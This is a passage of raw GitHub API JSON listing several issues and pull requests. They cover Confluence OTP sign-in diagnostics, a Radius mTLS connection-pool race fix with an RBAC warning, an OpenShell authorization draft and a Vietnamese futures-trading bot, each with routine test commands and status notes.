OTP-Codes in Fixtures oder Logs speichern, keine Änderungen an der Confluence-Sicherheitskonfiguration. Hier keine Live-Zugangsdaten vorhanden.\n5. **Erst nach Nachweis** den kleinsten Fix am gemeinsamen Transport/Adapter, an Proxy-Authentifizierung oder der Core-Anbindung durchführen; keine separaten Downloadimplementierungen je Oberfläche.\n\n### B – Fehlerdiagnose erhalten und korrekt anzeigen\n\n- Die Originalursache wird derzeit in `SignInRequests.submit()` zu `FAILED` reduziert. Einen strukturierten, **sanitisierten** Fehlerstatus für OTP-Submit/Resend anbieten (z. B. `NETWORK_UNAVAILABLE`, `PROXY_UNAVAILABLE`, `TLS_FAILURE`, `AUTHENTICATION_FAILED`, `REMOTE_HTTP_ERROR`, `TIMEOUT`, `UNEXPECTED`), mit sicherer Benutzermeldung und diagnostischer Ursache ohne Secrets.\n- Die UI darf nicht jede Fehlklasse als „Quelle nicht erreichbar“ ausgeben. Quelle-antwortete-mit-HTTP-Fehler vs. keine Verbindung vs. falscher OTP-Code trennen. Bei falschem OTP die bereits vorhandene Meldung der Confluence-Challenge anzeigen und Eingabe wieder ermöglichen.\n- Bestehende API-Verträge `/api/v1/sign-ins`, `POST /{id}/code`, `POST /{id}/resend` rückwärtskompatibel halten oder kontrolliert erweitern.\n- Bereits laufende Medienaufträge müssen nach erfolgreicher Eingabe an derselben Stelle fortsetzen; kein Verlust gespeicherter Assets/Export-Metadaten. Session-Cookies weiterhin ausschließlich im Adapter.\n\n### C – DRY und gemeinsamer Quellenzugriff\n\n**Alle** Bilder und Dateien aus derselben Confluence-Quelle müssen über **denselben** `HarvestSource`/Core-`Assets`/Confluence-Session- und OTP-Pfad gehen:\n- HTML-Leseansicht, Bildvergrößerung\n- „Anhänge“ und deren Viewer\n- „Analysen → Bilder“ bei tatsächlicher Beschaffung (Analyse-UI selbst darf keine zweite Netzwerklösung erzeugen)\n- verzögerter Export-Medienauftrag, Nachholen, Konvertierung\n\nUI-Komponenten dürfen sich im Präsentationsverhalten unterscheiden, aber keine eigene Proxy-, Cookie-, Form-Submit-, Auth- oder Retry-Implementierung enthalten. Gemeinsame Bibliothek `enterprise-ai-sources` weiterverwenden; bei einem Fix an ihrer Kopie auch den originalen Enterprise AI Client bzw. seine Tests auf Parität prüfen.\n\n### D – Regressionen\n\n- [ ] OTP-GET und OTP-POST gehen gemäß **derselben** Route/Proxy-Konfiguration zum selben Confluence-Origin.\n- [ ] Mit Proxy-Basic (und HTTPS-CONNECT) wird der Code angenommen, auch wenn eine Auth-Challenge während POST auftritt.\n- [ ] Erfolgreiche OTP-Freischaltung lässt Bilder, Anhänge und exportierte Medien über eine gemeinsame Web-Session laden; Cookies bleiben erhalten.\n- [ ] Falscher Code, 403, 407, TLS-Fehler, PAC-Routenfehler, Timeout, Redirectfehler sind unterscheidbar und ohne Secret-Leak diagnostizierbar.\n- [ ] Resend funktioniert und führt nicht zu eigener Session oder eigenem HTTP-Pfad.\n- [ ] Im Desktop funktioniert der reale Ablauf End-to-End: Bild verlangt OTP → Code per E-Mail → Eingabe → Bild sichtbar.\n- [ ] Bestehende Tests `ConfluenceOneTimeCodeTest`, `SignInOnDemandTest`, `SignInSlotTest`, `ExportMediaSignInTest` bleiben grün.\n\n**Wichtig:** Zunächst Ursache und Fehlerklasse feststellen. Aus dem Screenshot ist eine fehlerhafte Proxy-Route **noch nicht bewiesen**. Keine Sicherheitseinschränkungen, kein Direktverbindungs-Fallback bei nicht verfügbarer Proxy-Route, keine Umgehung von OTP oder mTLS.\n\nBezug: bereits abgeschlossenes #185 und [ADR 0018](https://github.com/aresstack/space-harvester/blob/main/docs/adr/0018-medienbeschaffung-und-otp-im-export.md).","reactions":{"url":"https://api.github.com/repos/aresstack/space-harvester/issues/571/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/aresstack/space-harvester/issues/571/timeline","performed_via_github_app":{"id":1144995,"client_id":"Iv23liVemv8A9if9v0F2","slug":"chatgpt-codex-connector","node_id":"A_kwHOAOQ6Gs4AEXij","owner":{"login":"openai","id":14957082,"node_id":"MDEyOk9yZ2FuaXphdGlvbjE0OTU3MDgy","avatar_url":"https://avatars.githubusercontent.com/u/14957082?v=4","gravatar_id":"","url":"https://api.github.com/users/openai","html_url":"https://github.com/openai","followers_url":"https://api.github.com/users/openai/followers","following_url":"https://api.github.com/users/openai/following{/other_user}","gists_url":"https://api.github.com/users/openai/gists{/gist_id}","starred_url":"https://api.github.com/users/openai/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/openai/subscriptions","organizations_url":"https://api.github.com/users/openai/orgs","repos_url":"https://api.github.com/users/openai/repos","events_url":"https://api.github.com/users/openai/events{/privacy}","received_events_url":"https://api.github.com/users/openai/received_events","type":"Organization","user_view_type":"public","site_admin":false},"name":"ChatGPT Codex Connector","description":"Bring ChatGPT and Codex to your GitHub repositories.","external_url":"https://www.chatgpt.com","html_url":"https://github.com/apps/chatgpt-codex-connector","created_at":"2025-02-14T01:37:05Z","updated_at":"2026-09-23T18:52:59Z","permissions":{"actions":"write","checks":"read","contents":"write","emails":"read","issues":"write","metadata":"read","pull_requests":"write","statuses":"read","workflows":"write"},"events":["check_run","check_suite","commit_comment","issues","issue_comment","pull_request","pull_request_review","pull_request_review_comment","pull_request_review_thread","repository","status","sub_issues"]},"state_reason":null,"pinned_comment":null,"score":1.0},{"url":"https://api.github.com/repos/radius-project/radius/issues/13719","repository_url":"https://api.github.com/repos/radius-project/radius","labels_url":"https://api.github.com/repos/radius-project/radius/issues/13719/labels{/name}","comments_url":"https://api.github.com/repos/radius-project/radius/issues/13719/comments","events_url":"https://api.github.com/repos/radius-project/radius/issues/13719/events","html_url":"https://github.com/radius-project/radius/pull/13719","id":6252531938,"node_id":"PR_kwDOFEv3AM8AAAABNbgyyA","number":13719,"title":"fix(authz): warn on RBAC use and replace expired mTLS pools","user":{"login":"sk593","id":42750942,"node_id":"MDQ6VXNlcjQyNzUwOTQy","avatar_url":"https://avatars.githubusercontent.com/u/42750942?v=4","gravatar_id":"","url":"https://api.github.com/users/sk593","html_url":"https://github.com/sk593","followers_url":"https://api.github.com/users/sk593/followers","following_url":"https://api.github.com/users/sk593/following{/other_user}","gists_url":"https://api.github.com/users/sk593/gists{/gist_id}","starred_url":"https://api.github.com/users/sk593/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/sk593/subscriptions","organizations_url":"https://api.github.com/users/sk593/orgs","repos_url":"https://api.github.com/users/sk593/repos","events_url":"https://api.github.com/users/sk593/events{/privacy}","received_events_url":"https://api.github.com/users/sk593/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":10641642403,"node_id":"LA_kwDOFEv3AM8AAAACekqTow","url":"https://api.github.com/repos/radius-project/radius/labels/pr:standard","name":"pr:standard","color":"86a16a","default":false,"description":"Ongoing maintenance, minor improvements, documentation updates, and routine development work","archived_at":null,"archived_by":null},{"id":12355410131,"node_id":"LA_kwDOFEv3AM8AAAAC4HCY0w","url":"https://api.github.com/repos/radius-project/radius/labels/pr:review-approved","name":"pr:review-approved","color":"1D76DB","default":false,"description":"Required reviews are approved; checks may still be pending","archived_at":null,"archived_by":null}],"state":"open","locked":false,"assignees":[{"login":"sk593","id":42750942,"node_id":"MDQ6VXNlcjQyNzUwOTQy","avatar_url":"https://avatars.githubusercontent.com/u/42750942?v=4","gravatar_id":"","url":"https://api.github.com/users/sk593","html_url":"https://github.com/sk593","followers_url":"https://api.github.com/users/sk593/followers","following_url":"https://api.github.com/users/sk593/following{/other_user}","gists_url":"https://api.github.com/users/sk593/gists{/gist_id}","starred_url":"https://api.github.com/users/sk593/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/sk593/subscriptions","organizations_url":"https://api.github.com/users/sk593/orgs","repos_url":"https://api.github.com/users/sk593/repos","events_url":"https://api.github.com/users/sk593/events{/privacy}","received_events_url":"https://api.github.com/users/sk593/received_events","type":"User","user_view_type":"public","site_admin":false}],"milestone":null,"comments":4,"created_at":"2026-11-06T23:31:16Z","updated_at":"2026-11-10T17:39:30Z","closed_at":null,"assignee":{"login":"sk593","id":42750942,"node_id":"MDQ6VXNlcjQyNzUwOTQy","avatar_url":"https://avatars.githubusercontent.com/u/42750942?v=4","gravatar_id":"","url":"https://api.github.com/users/sk593","html_url":"https://github.com/sk593","followers_url":"https://api.github.com/users/sk593/followers","following_url":"https://api.github.com/users/sk593/following{/other_user}","gists_url":"https://api.github.com/users/sk593/gists{/gist_id}","starred_url":"https://api.github.com/users/sk593/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/sk593/subscriptions","organizations_url":"https://api.github.com/users/sk593/orgs","repos_url":"https://api.github.com/users/sk593/repos","events_url":"https://api.github.com/users/sk593/events{/privacy}","received_events_url":"https://api.github.com/users/sk593/received_events","type":"User","user_view_type":"public","site_admin":false},"author_association":"CONTRIBUTOR","issue_field_values":[],"type":null,"active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/radius-project/radius/pulls/13719","html_url":"https://github.com/radius-project/radius/pull/13719","diff_url":"https://github.com/radius-project/radius/pull/13719.diff","patch_url":"https://github.com/radius-project/radius/pull/13719.patch","merged_at":null},"body":"## Summary\n\n<!-- Provide a concise description of what this PR does. -->\n\nWarn that Radius RBAC is a work in progress and full functionality is not guaranteed. Install and upgrade help identify the experimental settings, and install/reinstall/upgrade warn when effective RBAC settings are enabled, including stored values.\n\nFix the main-branch unit-test failure in `TestClientTransport_PeerExpiresOnOpenConnection`: retire the outbound mTLS connection pool before the next request when a certificate expires, so HTTP/2 cannot select a closed connection while its read loop is still processing the close. Retired pools close their idle connections on later requests and are dropped by the next request after they have no unexpired tracked connections; an expired connection in a retired pool does not replace the current pool again.\n\nSpeed up the `pkg/ucp/authorization` full-capacity tests, which made the unit-test job exceed its 30-minute timeout after #13354. Only the storage-layout check now builds a policy at the full 10,000-assignment/1,000-role limit, and it only writes it. The record limits moved into a store field (defaults unchanged) so rejection is tested with small limits. The rate-limited refresh runs on a small multi-page policy, and the full-size cost (174 GETs, 870 ms) is derived from the 86-page layout. The remaining full-size history tests run in parallel, and one full policy re-decode is replaced by an equivalent known-generation check.\n\nMake `TestServe_NilHandlerUsesDefaultServeMux` repeatable by registering a unique route per invocation. This preserves the default-mux behavior check without replacing global state shared by parallel tests.\n\n## Reason for change\n\n<!--\nExplain why this change is needed. If it addresses a GitHub issue, link it\nbelow so it is automatically closed when this PR merges (optional).\n-->\n\nUsers enabling the RBAC settings already on main need an explicit warning that they cannot rely on complete functionality or production access control.\n\nThe mTLS failure is a product race, not a test assertion to retry. Closing an active HTTP/2 connection does not synchronously remove it from the connection pool. A subsequent request can therefore fail with `use of closed network connection` instead of performing a new handshake.\n\nAfter merging #13354, `pkg/ucp/authorization` took 9m39s under `-race -coverprofile` in CI. The unit-test job was then cancelled at its 30-minute limit while uploading coverage, after all tests had passed. Profiling showed the time going to repeated JSON decoding of the ~16 MB full-size policy, multiplied by race instrumentation.\n\nRepeating the mTLS package also exposed a separate test-isolation defect: `TestServe_NilHandlerUsesDefaultServeMux` registered the same global route twice and panicked on the second invocation. Reproduced with `go test -race ./pkg/authz/mtls -run '^TestServe_NilHandlerUsesDefaultServeMux$' -count=2` before the fix. This is a test defect, not an mTLS runtime failure.\n\nPart of #13590. Observed on main in [Unit Tests run 42291317440](https://github.com/radius-project/radius/actions/runs/42291317440).\n\n## How to test\n\n<!--\nGive reproducible validation steps a reviewer can follow,\nincluding prerequisites, commands or actions, and expected results.\nDo not substitute a list of checks you already ran.\n-->\n\nWith the repository Go toolchain available, run:\n\n```sh\ngo test ./pkg/cli/helm ./pkg/cli/cmd/install/kubernetes ./pkg/cli/cmd/upgrade/kubernetes -count=1\ngo test ./pkg/authz/mtls -run '^TestClientTransport_PeerExpiresOnOpenConnection$' -count=100 -race\ngo test -race ./pkg/authz/... -count=1\ngo test -race ./pkg/authz/mtls -run '^TestServe_NilHandlerUsesDefaultServeMux$' -count=100\ngo test -race ./pkg/authz/mtls -count=20 -timeout=5m\n```\n\nExpect all commands to pass. The warning tests cover dry-run and enforcement, `--set-file`, stored values, explicit disablement, and unchanged non-RBAC operations. The mTLS regression deliberately delays HTTP/2 read-loop cleanup, checks fresh connections after renewal, preserves certificate-expiry rejection without renewal, and verifies interruption of active expired streams. Repeated nil-handler tests must continue to return HTTP 418 through the default mux in both `dryRun` and `enforce`, without duplicate-route panics.\n\nFor manual warning verification on a disposable Kubernetes cluster, use a CLI built from this branch and run:\n\n```sh\nrad install kubernetes --set global.rbac.dryRun=true\nrad install kubernetes --reinstall\nrad upgrade kubernetes\n```\n\nEach operation should print: `Warning: Radius RBAC is a work in progress. Full functionality is not guaranteed. Do not rely on it for production access control.` Both `rad install kubernetes --help` and `rad upgrade kubernetes --help` should describe RBAC as experimental. A default install with RBAC off should not print the runtime warning.\n\nValidation of the HTTP/2 retired-pool test (`1277291d9`):\n\n- `go test -race ./pkg/authz/mtls -run '^TestClientTransport_' -count=100` — passed all 100 repetitions. `TestClientTransport_RetiredPool` now runs its two cases over both HTTP/1.1 and HTTP/2, and the server asserts the negotiated protocol on every request.\n- Forcing the test server to HTTP/1.1 makes the HTTP/2 cases fail (`expected: 2`), so they cannot silently fall back.\n- `go test -race ./pkg/authz/mtls -count=1` — passed.\n\nValidation of the test-isolation fix (`e0f3ab670`):\n\n- `go test -race ./pkg/authz/mtls -run '^TestServe_NilHandlerUsesDefaultServeMux$' -count=100` — passed all 100 repetitions.\n- `go test -race ./pkg/authz/mtls -count=20 -timeout=5m` — passed all 20 full-package repetitions.\n- `git diff --check` — passed before commit.\n- Full `make test` and live-cluster verification were not rerun for this test-only change.\n\nEarlier validation of the warning, transport, and capacity changes:\n\n- `go test ./pkg/cli/helm ./pkg/cli/cmd/install/kubernetes ./pkg/cli/cmd/upgrade/kubernetes -count=1` — passed.\n- `go test ./pkg/authz/mtls -run '^TestClientTransport_PeerExpiresOnOpenConnection$' -count=100 -race` — all 100 iterations passed, including every HTTP/1.1/HTTP/2, leaf/intermediate/root, and renewed/unrenewed subcase.\n- `go test -race ./pkg/authz/... -count=1` — passed.\n- `go test -race ./pkg/authz/mtls -run TestClientTransport -count=30` — passed, including `TestClientTransport_RetiredPool`. Each of its two cases fails when its retired-pool behavior is removed.\n- `GOMAXPROCS=4 KUBEBUILDER_ASSETS=... go test -race -coverprofile=... ./pkg/ucp/authorization -count=1` — passed in 123s, down from 251s on the same base. Coverage rose from 86.5% to 86.8%; a per-function comparison showed no function lost coverage. The assignment-capacity tests now take about 12s under `-race`, down from about 83s; the remaining time is the full-size Bootstrap history test.\n- The HTTP/2 root-renewal regression failed against the original `client.go` using a Go source overlay, reproducing `use of closed network connection`; it passes with the fix.\n- Local Markdown/spelling checks were blocked by missing tooling; see the PR checks for CI results.\n\n## File change summary\n\n<!-- Summarize the change made in each file that was modified. -->\n\n| File | Summary of change |\n| ---- | ----------------- |\n| `pkg/cli/helm/cert_manager.go` | Warn when effective RBAC mode is not off, before managing cert-manager. |\n| `pkg/cli/helm/cert_manager_test.go` | Cover warning presence, ordering, stored values, file overrides, and RBAC-off behavior. |\n| `pkg/cli/helm/cluster.go` | Update the shared logging helper's description for its broader use. |\n| `pkg/cli/cmd/install/kubernetes/kubernetes.go` | Describe experimental RBAC settings in installation help. |\n| `pkg/cli/cmd/upgrade/kubernetes/kubernetes.go` | Describe experimental RBAC settings and preserved values in upgrade help. |\n| `pkg/authz/mtls/client.go` | Switch to a fresh connection pool on expiry, close idle connections in retired pools, and forget retired pools once they have no unexpired connections. |\n| `pkg/authz/mtls/client_test.go` | Reproduce delayed HTTP/2 pool eviction deterministically without retries, and cover retired-pool cleanup and expiry over HTTP/1.1 and HTTP/2. |\n| `pkg/authz/mtls/serve_test.go` | Use a unique default-mux route per test invocation so repeated runs do not panic. |\n| `docs/contributing/contributing-code/contributing-code-control-plane/troubleshooting-installation.md` | Document the RBAC warning and when it appears. |\n| `pkg/ucp/authorization/policy_store.go` | Move the 10,000-assignment/1,000-role limits into a `policyLimits` store field with unchanged defaults. |\n| `pkg/ucp/authorization/policy_safety.go` | Check mutations against the store's limits. |\n| `pkg/ucp/authorization/policy_safety_test.go` | Pass default limits to `applyPolicyMutation`. |\n| `pkg/ucp/authorization/policy_store_test.go` | Make `TestPolicyStoreManifestCapacity` write-only; add `TestPolicyStoreRecordLimits` with small limits. |\n| `pkg/ucp/authorization/policy_cache_test.go` | Replace the full-size rate-limited refresh with `TestPolicyCacheRateLimitedRefresh` on a small multi-page policy. |\n| `pkg/ucp/authorization/policy_history_test.go` | Run the two full-size history tests in parallel; check the unchanged generation without re-decoding the full policy. |\n| `docs/contributing/contributing-code/contributing-code-tests/README.md` | Describe the split capacity tests and how the full-size refresh cost is derived. |\n| `docs/architecture/shared-runtime-and-armrpc.md` | Document outbound mTLS pool retirement and active-stream interruption on expiry. |\n\n\n","reactions":{"url":"https://api.github.com/repos/radius-project/radius/issues/13719/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/radius-project/radius/issues/13719/timeline","performed_via_github_app":null,"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/anurmatov/phleet/issues/475","repository_url":"https://api.github.com/repos/anurmatov/phleet","labels_url":"https://api.github.com/repos/anurmatov/phleet/issues/475/labels{/name}","comments_url":"https://api.github.com/repos/anurmatov/phleet/issues/475/comments","events_url":"https://api.github.com/repos/anurmatov/phleet/issues/475/events","html_url":"https://github.com/anurmatov/phleet/pull/475","id":6003120307,"node_id":"PR_kwDOR6RwRM8AAAABKUPteg","number":475,"title":"feat: begin OpenShell slice1 persistence and operator authorization","user":{"login":"fleet-agent[bot]","id":262168260,"node_id":"BOT_kgDOD6BexA","avatar_url":"https://avatars.githubusercontent.com/u/6738484?v=4","gravatar_id":"","url":"https://api.github.com/users/fleet-agent%5Bbot%5D","html_url":"https://github.com/apps/fleet-agent","followers_url":"https://api.github.com/users/fleet-agent%5Bbot%5D/followers","following_url":"https://api.github.com/users/fleet-agent%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/fleet-agent%5Bbot%5D/gists{/gist_id}","starred_url":"https://api.github.com/users/fleet-agent%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/fleet-agent%5Bbot%5D/subscriptions","organizations_url":"https://api.github.com/users/fleet-agent%5Bbot%5D/orgs","repos_url":"https://api.github.com/users/fleet-agent%5Bbot%5D/repos","events_url":"https://api.github.com/users/fleet-agent%5Bbot%5D/events{/privacy}","received_events_url":"https://api.github.com/users/fleet-agent%5Bbot%5D/received_events","type":"Bot","user_view_type":"public","site_admin":false},"labels":[],"state":"closed","locked":false,"assignees":[],"milestone":null,"comments":107,"created_at":"2026-10-23T18:13:40Z","updated_at":"2026-11-10T17:39:23Z","closed_at":"2026-11-10T17:39:23Z","assignee":null,"author_association":"CONTRIBUTOR","active_lock_reason":null,"draft":true,"pull_request":{"url":"https://api.github.com/repos/anurmatov/phleet/pulls/475","html_url":"https://github.com/anurmatov/phleet/pull/475","diff_url":"https://github.com/anurmatov/phleet/pull/475.diff","patch_url":"https://github.com/anurmatov/phleet/pull/475.patch","merged_at":null},"body":"partial source-first draft for #474, preserving #478 and continuing incomplete #479.\n\n| area | status |\n|---|---|\n| preserved | immutable leases/tombstones, exact retirement/reconcile/deletion, default-deny preparation, activated/committed-only memory |\n| pin | [80d76a5c](https://github.com/anurmatov/openshell/commit/80d76a5c72d2a752d811775b62c86e974bc2bf19) generated contracts |\n| D1 source | outside hook/issuer/ingress → dedicated receiver → fresh SQL/current-supervisor/nonce checks; no preactivation intake |\n| capability/control | outside per-launch archive delivery, actual guard file consumption, atomic service exposure and exact-ID/pinned-origin control probe |\n| admission delta | immutable supplied approval reference/policy/labels, default/custom workspace compatibility and exact grammar checked before mutation; no synthesized approval or disabled admission |\n| cleanup delta | verified runtime absence → exact name/nonce volume deletion and 404 → plaintext retirement/nonsecret marker → fresh runtime proof → slot release |\n| cleanup limits | unknown/read/delete/filesystem/proof failures stay pending; terminal/deletion paths verify artifact retirement; no automatic mutation retry |\n| cleanup lease | active-slot release requires the matching lifecycle lease present, owned and unexpired at the trusted clock, rechecked after artifact/evidence I/O before commit; missing/expired/expiry-during-I/O refuse by named code; already-retired rows stay idempotent without a lease |\n| preparation recovery | guarded operator-only `reconcile-preparation` route for pending-preparation launches: pending migration state, revoked slot-holding row, launch-owned expired lease; Stop-or-Delete decided by persisted intents, replay reuses only the persisted identity, Delete continuation only after fresh stop proof, intent-less rows retire solely on complete launch-owned inventory proof; no metadata promotion, no Create retry; a refreshed observation must equal the persisted gateway/workspace/ID before proof, intent record or Delete |\n| env backfill | missing-key append now inserts the missing final separator instead of concatenating onto a recorded value; no-final-LF and repeated-run preservation regressions in the config harness |\n| preflight | concrete static/artifact/hook/exact-ID-stop preflight: recorded Describe/ValidateConfig are the generated `MiddlewareManifest`/`ValidateConfigResponse` wire messages (middleware proto byte-pinned in `OpenShell/Proto/UPSTREAM`), digest-sealed over the pinned binary plus records and bound three-way — configured name = plan-selected registration (entry Middleware field; map key is policy-local) = request `middleware_name` — and to the approved plan's middleware config; ingress and dedicated receiver validated independently (distinct ports valid, API-port collision refused); opt-in registration only, default-deny unchanged |\n| current policy | authorized reader seam over ComputeDriver.GetCapabilities.resource_admission_policy only; no production reader exists and none is invented — qualification refuses without it |\n| authority | no production policy reader, adapter registration, preparation issuer or feature enablement added |\n| local tests | at this head: 1712 orchestrator non-migration and 58 identity passes, zero skips; config harness passes including the new no-LF regressions; migration suites UNRUN (approved throwaway MySQL target required) |\n| local builds | named Agent/Identity/Orchestrator builds pass; preflight class adds 46 cases |\n| receipts | raw regression-red and final outputs retained; owned SQLite/synthetic-engine observations, not real runtime or Rust-driver acceptance |\n| wider limits | full Agent not rerun; historical 8 listener failures unwaived; real MySQL/restore/runtime UNRUN; successor CI not awaited; recovery/cleanup-lease behavior qualified by owned synthetic proofs only — the D2 evidence reader remains unimplemented and unregistered |\n| #479 outstanding | authorized capabilities current-policy reader and authenticated D2 runtime-evidence reader retained fail-closed pending the reviewed upstream ownership contract |\n| parent holds | remaining activation/native callback/replacement/rollback/install, final-head independent whole-PR audit and manual public scrub, green exact-head CI, executed acceptance and separately authorized exact-image/actual-agent/MySQL cleanup-backup-restore |\n\nrefs #474, #478 and #479; no package/parent completion or merge recommendation.\n","reactions":{"url":"https://api.github.com/repos/anurmatov/phleet/issues/475/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/anurmatov/phleet/issues/475/timeline","performed_via_github_app":null,"state_reason":null,"score":1.0},{"url":"https://api.github.com/repos/pichu124/Future-trading/issues/1","repository_url":"https://api.github.com/repos/pichu124/Future-trading","labels_url":"https://api.github.com/repos/pichu124/Future-trading/issues/1/labels{/name}","comments_url":"https://api.github.com/repos/pichu124/Future-trading/issues/1/comments","events_url":"https://api.github.com/repos/pichu124/Future-trading/issues/1/events","html_url":"https://github.com/pichu124/Future-trading/pull/1","id":6263288509,"node_id":"PR_kwDOVmPP7M8AAAABNj-6ag","number":1,"title":"P1.2–P5.2: risk, paper broker, backtest, ORB, feed DNSE/SSI, recorder, khẩn cấp, runner + sửa lỗi go-live","user":{"login":"pichu124","id":256937100,"node_id":"U_kgDOD1CMjA","avatar_url":"https://avatars.githubusercontent.com/u/256937100?v=4","gravatar_id":"","url":"https://api.github.com/users/pichu124","html_url":"https://github.com/pichu124","followers_url":"https://api.github.com/users/pichu124/followers","following_url":"https://api.github.com/users/pichu124/following{/other_user}","gists_url":"https://api.github.com/users/pichu124/gists{/gist_id}","starred_url":"https://api.github.com/users/pichu124/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/pichu124/subscriptions","organizations_url":"https://api.github.com/users/pichu124/orgs","repos_url":"https://api.github.com/users/pichu124/repos","events_url":"https://api.github.com/users/pichu124/events{/privacy}","received_events_url":"https://api.github.com/users/pichu124/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[],"state":"open","locked":false,"assignees":[],"milestone":null,"comments":0,"created_at":"2026-11-07T19:29:01Z","updated_at":"2026-11-10T17:38:26Z","closed_at":null,"assignee":null,"author_association":"OWNER","active_lock_reason":null,"draft":false,"pull_request":{"url":"https://api.github.com/repos/pichu124/Future-trading/pulls/1","html_url":"https://github.com/pichu124/Future-trading/pull/1","diff_url":"https://github.com/pichu124/Future-trading/pull/1.diff","patch_url":"https://github.com/pichu124/Future-trading/pull/1.patch","merged_at":null},"body":"## Tóm tắt\n\n14 commit, mỗi commit một module theo `PROMPTS.md`; module nào cũng viết test trước. `python -m pytest -q`: **569 test qua**. Riêng các phần quan trọng, tôi thử cố tình làm sai từng luật (mutation test) và mỗi lần đều có test báo lỗi.\n\n**Chưa chạy được live, và chưa nên chạy paper** cho tới khi có API key và adapter broker. Chi tiết ở `docs/golive_checklist.md`.\n\n## Nội dung theo module\n\n| Commit | Module | Chính |\n|---|---|---|\n| P2.1 | `risk/risk_manager.py` | Toàn bộ luật mục 5: `approve()` → `Approved/Rejected(code, reason)`; `check()` trả về KILL / FLATTEN / EMERGENCY; tính net trên mọi broker |\n| P2.2 | `brokers/base.py`, `brokers/paper.py` | Interface `BrokerAdapter`; paper khớp ở tick kế tiếp theo bid/ask + trượt giá, có độ trễ, phí lấy từ settings |\n| P3.1 | `backtest/engine.py`, `report.py`, `core/execution.py` | Backtest chạy đúng pipeline live; tick giả dựng từ bar theo hướng bi quan; `detect_lookahead`; báo cáo HTML theo mục 6 |\n| P3.2 | `strategy/baseline_orb.py` | ORB 15 phút, stop ở cạnh đối diện, chốt lời 1.5R, ≤ 2 lệnh/ngày (**chưa chạy in-sample** vì chưa có dữ liệu) |\n| P3.3 | `backtest/robustness.py` | IS/OOS, walk-forward, độ nhạy ±20%, trượt 2 tick; **luật kết luận edge chốt trong code trước khi có dữ liệu** |\n| P1.2 | `feeds/data_feed_dnse.py` | WebSocket DNSE V2; giao thức lấy từ mã nguồn SDK `dnse` 0.5.0; kết nối lại vô hạn, phát hiện im lặng |\n| P1.4 | `recorder/`, `scripts/record_today.py` | Ghi Parquet theo kiểu mỗi lần flush một part mới (crash không hỏng file); gộp cuối ngày; hướng dẫn Task Scheduler |\n| P1.3 | `feeds/data_feed_ssi.py`, `feeds/composite.py` | Feed SSI V3 (token qua hàm truyền vào); composite đối chiếu DNSE/SSI, tự chuyển nguồn |\n| P1.5 | `recorder/validate.py`, `scripts/validate_day.py` | Kiểm tra dữ liệu một ngày; phát hiện feed rơi message bằng cách so khối lượng luỹ kế; dựng bar 1 phút |\n| P4.3 | `live/emergency.py` | Đối ứng trên broker dự phòng khi broker chính mất kết nối; gỡ hedge đồng thời hai chân |\n| P5.1 | `live/runner.py` + `core/bars.py`, `live/state_store.py` | Runner paper: heartbeat khoá, kill-switch, `/kill /status /pnl`, báo cáo ngày, lưu bộ đếm rủi ro qua lần khởi động lại |\n| P5.2 | `docs/golive_checklist.md` | Đối chiếu CLAUDE.md, cộng một lượt review độc lập; 3 CRITICAL / 4 HIGH đã tái hiện bằng script |\n| fix | nhiều file | Sửa #1–#8, #10–#12, #14 trong checklist; mỗi lỗi có test tái hiện (`tests/test_golive_fixes.py`) |\n| #9 | risk + runner + engine | Luật mới: đang có vị thế mà mất dữ liệu > 30s ⇒ đóng hết bằng MTL |\n\n## Các quyết định cần bạn xem kỹ\n\n1. **Đổi luật risk cho lệnh *giảm* vị thế:** bỏ trần hợp đồng \"kịch bản xấu nhất\". Luật này từng chặn lệnh đối ứng khẩn cấp và lệnh flatten mỗi khi có stop + chốt lời. Thay bằng luật cấm hai lệnh đóng cùng chiều trên cùng broker (`DUPLICATE_CLOSE`). Lệnh *mở* giữ nguyên trần cũ.\n2. **Luật mới trong CLAUDE.md §5:** `flatten_on_feed_silence_seconds` (30s), theo quyết định của bạn ở #9. Đây là lần duy nhất PR này sửa CLAUDE.md.\n3. **Thêm thư viện `websockets>=12.0`:** nhỏ, thuần Python, chính SDK DNSE cũng dùng.\n4. **Paper broker chặt hơn:** LO đặt khi giá chưa tới thì nằm chờ ngay từ lúc đặt. Trước đây paper khớp chốt lời ở giá tốt hơn thật khi giá nhảy qua.\n5. **Khoá khẩn cấp / kill-switch không tự mở**, kể cả sang ngày mới. Người phải gọi `clear_emergency` / `clear_kill` sau khi đối soát.\n6. **`.env.example` đổi sang biến DNSE V2 / SSI V3** (`DNSE_API_KEY`, `SSI_API_KEY`…).\n\n## Chưa làm / bị chặn (cần API key)\n\n- P1.6 tải dữ liệu lịch sử, rồi chạy `backtest.robustness` cho ORB. Hiện **chưa có bằng chứng edge**.\n- P4.1/P4.2 adapter DNSE/SSI, gồm REST danh sách hợp đồng, token SSI và stop do bot tự giữ. Runner đang từ chối chạy live có chủ đích.\n- Các mục ❓ trong `docs/broker_notes.md` chưa được kiểm bằng gọi thử. Message mẫu trong `tests/fixtures/` dựng theo SDK, chưa phải message thật.\n- Checklist #13: đối chiếu DNSE/SSI trong runner, chờ token SSI.\n\n## Việc của bạn trước khi chạy\n\n- Điền 10 khoá null trong `settings.yaml` (phí, rủi ro, `live.allowed_machine`), bổ sung `holidays.yaml` 2026–2027.\n- Đăng ký DNSE Open API V2 + SSI FastConnect V3, rồi chạy `scripts/dnse_feed_probe.py` để chốt các mục ❓.\n\n## Kiểm thử\n\n- `python -m pytest -q`: 569 passed (Linux, Python 3.13). CI GitHub Actions chạy cả Windows.\n- Không có secret nào trong repo; test 